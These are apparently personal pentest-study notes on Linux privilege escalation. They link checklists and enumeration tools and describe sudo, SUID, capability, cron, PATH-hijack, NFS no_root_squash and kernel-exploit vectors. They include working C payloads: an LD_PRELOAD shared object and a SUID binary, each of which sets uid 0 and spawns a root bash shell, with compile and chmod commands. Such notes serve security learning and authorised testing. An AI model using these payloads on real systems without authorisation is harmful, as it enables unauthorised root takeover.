tags: #type/theory #tech/OS/linux #tactic/privilege-escalation 

---

Useful checklists for privesc:
- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

# scripts
scripts for privesc enumeration:
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - best tool :)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
# vectors:
**Info for specific tools: [https://gtfobins.github.io/](https://gtfobins.github.io/)**
goals:
- incorporate root user
- create root user

find anything with you can run with root priviliges and start shell out of it
	- vi (`:!sh` to start shell)
- if /etc/passwd is writeable: add user with root priviliges
- rewrite PATH: if a program running as root (SUID privilige) calls a system command,  you can c(hange the PATH, so the program will call a "command" you choose/supply to it

## Sudo priviliges
`sudo -l` to see what commands the user can run with sudo
Many tools can be used to spawn a shell, that in turn also has root privs

## SUID/GUID binaries
find all files with SUID permission (those files always run as the file owner, not the user who executes it)
`find / -perm -u=s -type f 2>/dev/null`
`find / -type f -perm -04000 -ls 2>/dev/null`
find all SUID/SGID files:
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
these files can then be used for privilege escalation

## Kernel exploits
1.  Identify the kernel version
2.  Search and find an exploit code for the kernel version of the target system
3.  Run the exploit
resource:
[https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
## LD_PRELOAD
LD_PRELOAD is a function that allows any program to use shared libraries.

1.  Check for LD_PRELOAD (use `sudo -l` and look for `env_keep` option)
2.  Write a simple C code compiled as a share object (.so extension) file
3.  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

C Code:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
} 
```  

compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

## Capabilities
the capabilties of a file can be changed, so a low privilige user can execute just this file 
find files: `getcap -r / 2>/dev/null`
see gtfobins for tool specific info

## Cronjobs
- cronjob running as root: see in `/etc/crontab`
- if file the cronjob is running is accessible by other users -> exploitable

possible scenario in company:
1.  System administrators need to run a script at regular intervals.
2.  They create a cron job to do this
3.  After a while, the script becomes useless, and they delete it  
4.  They do not clean the relevant cron job

## PATH
prerequisites:
- writeable folders in PATH or PATH can be changed
- application with root priviliges relies on PATH

search for writeable folders: `find / -writable 2>/dev/null`
search for subdirectories of writeable folders: `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
modify PATH: `export PATH=/tmp:$PATH`

## NFS
[[2_Tech-Specifics/Network/Protocols/NFS]]
critical option for privesc: rw, no_root_sqash
1. connect to nfs
2. generate file that launches bash (see section payloads)
3. set ownership of file to "root" and set suid
4. execute on target system -> root shell is started

# Payloads
c code to execute shell with suid and guid set
compile with: `gcc [filename] -o [filename] -w`
set suid with `chmod +s [filename]`
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
	return 0;
}
```  